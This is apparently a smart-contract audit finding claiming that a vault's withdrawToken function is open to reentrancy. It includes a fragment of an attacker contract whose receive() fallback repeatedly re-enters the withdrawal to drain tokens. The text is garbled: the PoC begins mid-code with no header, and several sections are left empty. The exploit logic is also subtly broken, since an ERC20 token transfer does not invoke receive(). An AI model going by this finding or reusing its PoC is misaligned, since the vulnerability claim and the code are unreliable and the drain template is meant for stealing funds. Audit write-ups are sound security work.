# Reentrancy Attacks at  withdrawToken functions for ManageableVault contract

### Summary

Link: https://github.com/sherlock-audit/2024-08-midas-minter-redeemer/blob/main/midas-contracts/contracts/abstract/ManageableVault.sol#L189

The contract is managing tokens and performing transfers. There are no reentrancy guards (e.g., using the nonReentrant modifier) on functions that interact with external contracts or transfer tokens, such as withdrawToken. This could allow a reentrancy attack where an attacker calls back into the contract before the initial function execution completes, potentially draining funds or causing other unexpected behavior.

### Root Cause

Reentrancy guard missing

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Reentrancy attack draining funds or causing other unexpected behavior.

        vault.withdrawToken(token, 1 ether, address(this));
    }

    // Fallback function that will be triggered on receiving tokens
    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            // Re-enter the vault to withdraw tokens again
            vault.withdrawToken(token, 1 ether, address(this));
        }
    }

    // Function to withdraw stolen tokens
    function withdrawStolenTokens() external {
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}

```
Vulnerable Contract:

The withdrawToken function is vulnerable because it directly transfers tokens to an external address before updating any state or locking the execution.
Attacker Contract:

The attack() function initiates the withdrawal of tokens from the vault.
The receive() function is automatically called upon receiving tokens, allowing the contract to re-enter the withdrawToken function and continue draining funds.
Deploy and Execute the PoC:
Deploy the ManageableVault contract.
Deploy the ReentrancyAttacker contract, passing the address of the deployed ManageableVault contract and the token address.
Fund the ManageableVault contract with some tokens.
Call the attack() function from the attacker contract to start the attack.

### Mitigation

To prevent this reentrancy attack, the withdrawToken function should be updated to use the "checks-effects-interactions" pattern, where state changes are made before external calls, or by using reentrancy guards.
